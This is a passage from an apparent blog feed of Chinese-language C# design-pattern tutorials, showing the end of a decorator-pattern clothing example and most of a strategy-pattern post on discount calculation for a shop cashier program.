operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Sneakers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            BigTrouser kk <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigTrouser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            TShirts dtx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TShirts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//装饰过程          ---里氏替换原则</span>            pqx<span class="token punctuation">.</span><span class="token function">Decorate</span><span class="token punctuation">(</span>xc<span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">//破球鞋装扮</span>            kk<span class="token punctuation">.</span><span class="token function">Decorate</span><span class="token punctuation">(</span>pqx<span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">//跨库装扮</span>            dtx<span class="token punctuation">.</span><span class="token function">Decorate</span><span class="token punctuation">(</span>kk<span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">//大T衫装扮</span>            dtx<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                         <span class="token comment" spellcheck="true">//回调方法直至最底层</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"\n第二种装扮："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            LeatherShoes px <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LeatherShoes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                       Tie ld <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Tie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                        Suit xz <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Suit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                      <span class="token comment" spellcheck="true">//装饰过程</span>            px<span class="token punctuation">.</span><span class="token function">Decorate</span><span class="token punctuation">(</span>xc<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">//皮鞋装扮 </span>            ld<span class="token punctuation">.</span><span class="token function">Decorate</span><span class="token punctuation">(</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">//领带装扮</span>            xz<span class="token punctuation">.</span><span class="token function">Decorate</span><span class="token punctuation">(</span>ld<span class="token punctuation">)</span><span class="token punctuation">;</span>                         <span class="token comment" spellcheck="true">//西装装扮</span>            xz<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"\n第三种装扮："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Sneakers pqx2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Sneakers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            LeatherShoes px2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LeatherShoes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            BigTrouser kk2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigTrouser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Tie ld2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Tie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//装饰过程</span>            pqx2<span class="token punctuation">.</span><span class="token function">Decorate</span><span class="token punctuation">(</span>xc<span class="token punctuation">)</span><span class="token punctuation">;</span>            px2<span class="token punctuation">.</span><span class="token function">Decorate</span><span class="token punctuation">(</span>pqx<span class="token punctuation">)</span><span class="token punctuation">;</span>            kk2<span class="token punctuation">.</span><span class="token function">Decorate</span><span class="token punctuation">(</span>px2<span class="token punctuation">)</span><span class="token punctuation">;</span>            ld2<span class="token punctuation">.</span><span class="token function">Decorate</span><span class="token punctuation">(</span>kk2<span class="token punctuation">)</span><span class="token punctuation">;</span>            ld2<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">region</span> Person类(ConcreteComponent)</span>    <span class="token keyword">class</span> <span class="token class-name">Person</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span> <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> name<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token keyword">string</span> name<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"装扮的{0}"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 服饰类(Decorator)</span>    <span class="token keyword">class</span> <span class="token class-name">Finery</span> <span class="token punctuation">:</span> Person    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> Person component<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//打扮</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Decorate</span><span class="token punctuation">(</span>Person component<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>component <span class="token operator">=</span> component<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">void</span> <span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//调用的是父类中的方法</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>component <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                component<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 具体服饰类(ConcreteDecorator)</span>    <span class="token keyword">class</span> <span class="token class-name">TShirts</span> <span class="token punctuation">:</span> Finery    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">void</span> <span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token string">"大T恤 "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">base</span><span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">BigTrouser</span> <span class="token punctuation">:</span> Finery    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">void</span> <span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token string">"垮裤 "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">base</span><span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">Sneakers</span> <span class="token punctuation">:</span> Finery    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">void</span> <span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token string">"破球鞋 "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">base</span><span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">Suit</span> <span class="token punctuation">:</span> Finery    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">void</span> <span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token string">"西装 "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">base</span><span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">Tie</span> <span class="token punctuation">:</span> Finery    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">void</span> <span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token string">"领带 "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">base</span><span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">LeatherShoes</span> <span class="token punctuation">:</span> Finery    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">void</span> <span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token string">"皮鞋 "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">base</span><span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span><span class="token punctuation">}</span></code></pre><h2 id="装饰模式-基本代码"><a href="#装饰模式-基本代码" class="headerlink" title="装饰模式-基本代码"></a>装饰模式-基本代码</h2><p><strong>抽象组件对象</strong></p><pre class=" language-csharp"><code class="language-csharp">    <span class="token comment" spellcheck="true">//对象的接口</span>    <span class="token comment" spellcheck="true">//可以为对象动态添加职责</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Component</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">void</span> <span class="token function">Operation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p><strong>具体组件对象</strong></p><pre class=" language-csharp"><code class="language-csharp">    <span class="token comment" spellcheck="true">//定义一个具体的对象</span>    <span class="token comment" spellcheck="true">//可以为该对象添加一些职责</span>    <span class="token keyword">class</span> <span class="token class-name">ConcreteComponent</span> <span class="token punctuation">:</span> Component    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">void</span> <span class="token function">Operation</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"具体对象的操作"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p><strong>装饰器对象</strong></p><pre class=" language-csharp"><code class="language-csharp">    <span class="token comment" spellcheck="true">//装饰抽象类</span>    <span class="token comment" spellcheck="true">//从外部扩展Component类对象的功能</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Decorator</span> <span class="token punctuation">:</span> Component    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> Component component<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">SetComponent</span><span class="token punctuation">(</span>Component component<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>component <span class="token operator">=</span> component<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">void</span> <span class="token function">Operation</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>component <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                component<span class="token punctuation">.</span><span class="token function">Operation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p><strong>具体装饰器对象</strong></p><pre class=" language-csharp"><code class="language-csharp">    <span class="token comment" spellcheck="true">//具体的装饰对象</span>    <span class="token comment" spellcheck="true">//为Component添加职责的功能</span>    <span class="token keyword">class</span> <span class="token class-name">ConcreteDecoratorA</span> <span class="token punctuation">:</span> Decorator    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> addedState<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">void</span> <span class="token function">Operation</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">base</span><span class="token punctuation">.</span><span class="token function">Operation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            addedState <span class="token operator">=</span> <span class="token string">"New State"</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"具体装饰对象A的操作"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//具体的装饰对象</span>    <span class="token comment" spellcheck="true">//为Component添加职责的功能</span>    <span class="token keyword">class</span> <span class="token class-name">ConcreteDecoratorB</span> <span class="token punctuation">:</span> Decorator    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">void</span> <span class="token function">Operation</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">base</span><span class="token punctuation">.</span><span class="token function">Operation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">AddedBehavior</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"具体装饰对象B的操作"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">AddedBehavior</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p><strong>测试类</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token keyword">class</span> <span class="token class-name">Program</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            ConcreteComponent c <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConcreteComponent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            ConcreteDecoratorA d1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConcreteDecoratorA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            ConcreteDecoratorB d2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConcreteDecoratorB</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            d1<span class="token punctuation">.</span><span class="token function">SetComponent</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>            d2<span class="token punctuation">.</span><span class="token function">SetComponent</span><span class="token punctuation">(</span>d1<span class="token punctuation">)</span><span class="token punctuation">;</span>            d2<span class="token punctuation">.</span><span class="token function">Operation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C# </tag>
            
            <tag> 设计模式 </tag>
            
            <tag> 装饰模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>策略模式</title>
      <link href="/2020/08/22/ce-lue-mo-shi/"/>
      <url>/2020/08/22/ce-lue-mo-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="定义理解"><a href="#定义理解" class="headerlink" title="定义理解"></a>定义理解</h1><p>​        策略模式时一种<strong>行为型模式</strong>，主要用于需要使用不同的算法来处理不同的数据（对象）时。策略模式是一种定义一系列算法的的方法，从概念上来看，所有这些算法完成的都是相同的工作，只是实现不同，它可以以相同的方式调用所有的算法，减少各种算法类与使用算法类之间的耦合，即<strong>在运行时选择算法</strong>。</p><p>​        <font color="blue">定义算法家族，分别封装起来，让它们之间可以相互替换，此模式让算法的变化，不会影响到使用算法的客户 。</font></p><h1 id="角色与职责"><a href="#角色与职责" class="headerlink" title="角色与职责"></a>角色与职责</h1><ul><li><p><strong>抽象策略角色（Strategy）</strong>：策略类，通常由一个<strong>接口</strong>或者<strong>抽象类</strong>来实现</p><p>​        定义一个公共接口，各种不同的算法以不同的方式实现这个接口，Context使用这个接口调用不同的算法，一般用接口或抽象类来实现。</p></li><li><p><strong>具体策略角色（ConcreteStrategy）</strong>：包装了相关的<strong>算法和行为</strong></p><p>​        实现Strategy定义的接口，提供具体的算法实现。</p></li><li><p><strong>环境角色（Context）</strong>：持有一个<strong>策略类的引用</strong>最终给客户端调用</p><ul><li>需要使用ConcreteStrategy提供的算法</li><li>内部维护一个Strategy的实例</li><li>负责动态设置运行时Strategy具体的实现算法</li><li>负责跟Strategy之间的交互和数据传递</li></ul></li></ul><h1 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h1><ol><li>识别客户端可能需要的各种算法（即功能）（<strong>抽象策略角色</strong>）</li><li>在接口中指定该算法的签名（原型）（<strong>具体策略角色</strong>）</li><li>在派生类中提供可选择的实现细节（<strong>环境角色</strong>）</li><li>将客户端的算法和接口耦合</li></ol><h1 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h1><p><strong>代码结构图</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/策略模式/策略模式结构图.jpg" alt="策略模式结构图"></center><p><strong>抽象策略角色</strong>：</p><p><strong>CashSuper类</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//算法的公共接口</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">CashSuper</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//抽象出来的接口方法</span>        <span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">double</span> <span class="token function">acceptCash</span><span class="token punctuation">(</span><span class="token keyword">double</span> money<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>具体策略角色</strong>：</p><p><strong>CashNormal类</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//不折扣算法</span>    <span class="token keyword">class</span> <span class="token class-name">CashNormal</span> <span class="token punctuation">:</span> CashSuper    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">double</span> <span class="token function">acceptCash</span><span class="token punctuation">(</span><span class="token keyword">double</span> money<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> money<span class="token punctuation">;</span>        <span class="token punctuation">}</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>CashRebate类</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//折扣算法</span>    <span class="token keyword">class</span> <span class="token class-name">CashRebate</span> <span class="token punctuation">:</span> CashSuper    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 几折（默认为1折）</span>        <span class="token keyword">private</span> <span class="token keyword">double</span> moneyRebate <span class="token operator">=</span> 1d<span class="token punctuation">;</span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 带参构造函数-设置打折力度</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 带参构造函数-设置打折力度</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="moneyRebate">几折&lt;/param></span>        <span class="token keyword">public</span> <span class="token function">CashRebate</span><span class="token punctuation">(</span><span class="token keyword">string</span> moneyRebate<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>moneyRebate <span class="token operator">=</span> <span class="token keyword">double</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>moneyRebate<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 重写acceptCash方法</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 重写acceptCash方法</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="money">原始钱数&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;returns>返回折后钱数&lt;/returns></span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">double</span> <span class="token function">acceptCash</span><span class="token punctuation">(</span><span class="token keyword">double</span> money<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> money <span class="token operator">*</span> moneyRebate<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>CashReturn类</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//返利算法</span>    <span class="token keyword">class</span> <span class="token class-name">CashReturn</span> <span class="token punctuation">:</span> CashSuper    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 金额限度</span>        <span class="token keyword">private</span> <span class="token keyword">double</span> moneyCondition <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">.</span>0d<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 返还力度</span>        <span class="token keyword">private</span> <span class="token keyword">double</span> moneyReturn <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">.</span>0d<span class="token punctuation">;</span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 构造函数-设置金额限度和返还力度</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 构造函数-设置金额限度和返还力度</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="moneyCondition">金额限度&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;param name="moneyReturn">返还力度&lt;/param></span>        <span class="token keyword">public</span> <span class="token function">CashReturn</span><span class="token punctuation">(</span><span class="token keyword">string</span> moneyCondition<span class="token punctuation">,</span> <span class="token keyword">string</span> moneyReturn<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>moneyCondition <span class="token operator">=</span> <span class="token keyword">double</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>moneyCondition<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>moneyReturn <span class="token operator">=</span> <span class="token keyword">double</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>moneyReturn<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 重构acceptCash方法</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 重构acceptCash方法</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="money">原始金额&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;returns>返回实际应付金额&lt;/returns></span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">double</span> <span class="token function">acceptCash</span><span class="token punctuation">(</span><span class="token keyword">double</span> money<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">double</span> result <span class="token operator">=</span> money<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>money <span class="token operator">>=</span> moneyCondition<span class="token punctuation">)</span>                result <span class="token operator">=</span> money <span class="token operator">-</span> Math<span class="token punctuation">.</span><span class="token function">Floor</span><span class="token punctuation">(</span>money <span class="token operator">/</span> moneyCondition<span class="token punctuation">)</span> <span class="token operator">*</span> moneyReturn<span class="token punctuation">;</span>            <span class="token keyword">return</span> result<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>环境角色</strong>：</p><p><strong>CashContext类</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//收费策略Context</span>    <span class="token keyword">class</span> <span class="token class-name">CashContext</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//声明一个现金收费父类对象</span>        <span class="token keyword">private</span> CashSuper cs<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//设置策略行为，参数为具体的现金收费子类（正常，打折或返利）</span>        <span class="token keyword">public</span> <span class="token function">CashContext</span><span class="token punctuation">(</span>CashSuper csuper<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>cs <span class="token operator">=</span> csuper<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//得到现金促销计算结果（利用了多态机制，不同的策略行为导致不同的结果）</span>        <span class="token keyword">public</span> <span class="token keyword">double</span> <span class="token function">GetResult</span><span class="token punctuation">(</span><span class="token keyword">double</span> money<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> cs<span class="token punctuation">.</span><span class="token function">acceptCash</span><span class="token punctuation">(</span>money<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>测试类</strong>：</p><p><strong>测试界面</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/策略模式/策略模式测试界面.png" alt="策略模式测试界面"></center><p><strong>测试类代码</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Windows<span class="token punctuation">.</span>Forms<span class="token 